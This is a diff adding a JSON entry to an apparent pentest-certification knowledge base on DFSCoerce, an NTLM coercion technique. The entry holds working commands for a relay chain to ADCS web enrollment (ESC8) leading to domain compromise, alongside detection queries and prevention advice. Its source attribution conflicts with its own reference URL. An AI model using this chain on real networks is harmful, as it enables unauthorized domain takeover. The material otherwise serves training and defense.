@@ -1,0 +1,102 @@
+{
+  "id": "ad-dfscoerce",
+  "name": "DFSCoerce - NTLM Coercion via MS-DFSNM",
+  "command": "python3 dfscoerce.py -u <user> -p <pass> -d <domain> -dc-ip <dc_ip> <listener_ip>",
+  "description": "DFSCoerce abuses the MS-DFSNM (Distributed File System Namespace Management) protocol to coerce NTLM authentication from a target server. Like PetitPotam but uses a different RPC interface (netdfs). Combined with ntlmrelayx targeting ADCS HTTP enrollment (ESC8) or LDAP, it enables domain compromise from a low-privileged user.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Coercion & Relay",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "FiloSottile/dfscoerce; CRTP coercion module",
+  "tags": [
+    "dfscoerce",
+    "ms-dfsnm",
+    "ntlm-coercion",
+    "relay",
+    "adcs",
+    "esc8"
+  ],
+  "mitre": [
+    "T1187",
+    "T1557.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nMS-DFSNM provides RPC calls (NetrDfsRemoveStdRoot, NetrDfsAddStdRoot)\nthat trigger the target to authenticate back to an attacker-controlled\nlistener. This NTLM auth can be relayed to ADCS, LDAP, or SMB.\n\n=== INSTALL ===\n  git clone https://github.com/Shutdown06/DFSCoerce\n  pip3 install impacket\n\n=== RELAY CHAIN (with ADCS ESC8) ===\n  # Terminal 1 - start relay to ADCS web enrollment\n  ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n  # Terminal 2 - trigger coercion\n  python3 dfscoerce.py -u <user> -p <pass> -d <domain> -dc-ip <dc_ip> <listener_ip>\n  # Terminal 3 - use the certificate\n  python3 gettgtpkinit.py <domain>/<dc_name>$ <dc_name>.ccache -cert-pfx <dc_name>.pfx\n\n=== ALTERNATIVE COERCERS ===\nCoercer.py combines multiple protocols (MS-EFSR, MS-RPRN, MS-DFSNM,\nMS-FSRVP) into one tool. Use it to test all methods at once.",
+  "examples": [
+    {
+      "label": "Coerce DC authentication via DFS",
+      "command": "python3 dfscoerce.py -u jdoe -p Password123 -d corp.local -dc-ip 192.168.1.10 192.168.1.50"
+    },
+    {
+      "label": "Relay chain with ADCS ESC8",
+      "command": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+    },
+    {
+      "label": "Multi-protocol coercion with Coercer",
+      "command": "python3 Coercer.py -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>"
+    }
+  ],
+  "references": [
+    {
+      "title": "DFSCoerce - GitHub",
+      "url": "https://github.com/Shutdown06/DFSCoerce"
+    },
+    {
+      "title": "Coercer - Multi-protocol",
+      "url": "https://github.com/p0dalirius/Coercer"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-shadowcoerce",
+      "note": "Another NTLM coercion method via MS-FSRVP. Chain both for coverage.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cdsa-m06-pki-esc8",
+      "note": "Relay coerced auth to ADCS HTTP enrollment for domain takeover.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "MS-DFSNM RPC calls trigger NTLM authentication callbacks from the target server to an attacker-specified UNC path. The relayed credential can authenticate to other services.",
+    "prerequisites": "Valid domain credentials; network access to target RPC (TCP 445) and relay target.",
+    "impact": "Domain compromise when relayed to ADCS (ESC8) or LDAP for RBCD/Shadow Credentials.",
+    "detection": "[MITRE T1187] RPC calls to the DFS Namespace service from unusual sources; NTLM relay indicators.",
+    "artifacts": "Windows Security Event 4624 (Type 3) from unexpected sources; ADCS enrollment logs; Sysmon network connections.",
+    "splunk_spl": "index=windows EventCode=4624 LogonType=3 TargetUserName=\"*$\"\n| where like(IpAddress, \"10.%\") OR like(IpAddress, \"192.168.%\")\n| stats count by TargetUserName, IpAddress\n| where count > 5",
+    "elastic_kql": "event.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND user.name:*$",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| summarize count() by TargetUserName, IpAddress\n| where count_ > 5",
+    "sigma_rules": "win_security_ntlm_relay_dfs_coercion",
+    "prevention": "Enforce EPA (Extended Protection for Authentication) on ADCS web enrollment; disable NTLM where possible; require SMB signing; restrict RPC access to DFS services.",
+    "sources": [
+      "CRTP coercion module",
+      "https://attack.mitre.org/techniques/T1187/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "DFSCoerce - Anomalous machine account NTLM authentication",
+        "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| where AuthenticationPackageName == \"NTLM\"\n| summarize AuthCount=count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)\n| where AuthCount > 3",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4624"
+        ],
+        "attack": [
+          "T1187",
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate DFS operations; domain controller replication",
+        "tuning": "Baseline normal machine account authentication patterns; alert on new source IPs"
+      }
+    ]
+  }
+}
